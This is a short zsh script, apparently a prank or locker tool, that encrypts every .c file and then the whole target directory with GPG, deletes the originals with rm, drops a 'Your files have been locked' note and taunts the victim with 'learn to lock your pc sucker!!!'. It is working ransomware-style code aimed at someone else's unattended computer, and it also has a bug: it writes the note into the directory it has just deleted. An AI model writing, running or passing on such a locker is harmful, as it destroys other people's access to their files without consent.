#!/bin/zsh

RED='\033[0;31m'
NC='\033[0m'
LA='\033[0;33m'

# Function to password protect a directory and its contents
password_protect_directory() {
  local directory="$1"
  local password="$2"
  # Encrypt the directory with GPG using symmetric encryption
  tar -cz "$directory" | gpg --quiet --symmetric --passphrase "$password" --output "$directory.tar.gz.gpg"
  # Remove the original directory after encryption
  rm -rf "$directory"
  echo "${LA}Password protected directory:${NC} $directory"
  # Create instructions file
  echo "${RED}Your files have been locked.${NC}" > "$directory/locked_instructions.txt"
}

# Function to password protect .c files
password_protect_c_files() {
  local directory="$1"
  local password="$2"
  # Find all .c files in the specified directory and its subdirectories
  find "$directory" -type f -name "*.c" -exec gpg --quiet --symmetric --passphrase "$password" {} \;
  # Remove the original files after encryption
  find "$directory" -type f -name "*.c" -exec rm {} \;
  echo "${LA}Password protected .c files in directory:${NC} $directory"
}

# Function to password protect .c files and directories in the specified directory and its subdirectories
password_protect_recursive() {
  local directory="$1"
  local password="$2"
  # Password protect .c files in the specified directory
  password_protect_c_files "$directory" "$password"
  # Password protect the directory and its contents
  password_protect_directory "$directory" "$password"
}

# Check if a directory and password are provided as arguments
if [ "$#" -eq 0 ]; then
  directory="."
  echo "No directory specified. Using current directory: $directory"
  read -p "Enter password to lock files: " -s password
elif [ "$#" -eq 1 ]; then
  directory="$1"
  echo "Using specified directory: $directory"
  read -p "Enter password to lock files: " -s password
elif [ "$#" -eq 2 ]; then
  directory="$1"
  password="$2"
  echo "Using specified directory: $directory"
  echo "Using specified password"
else
  # If incorrect arguments are provided, display an error message
  echo "Usage: $0 [<directory> <password>]"
  exit 1
fi

# Password protect .c files and directories in the specified directory and its subdirectories
password_protect_recursive "$directory" "$password"

echo "${RED}All files have been locked, learn to lock your pc sucker!!!${NC}"
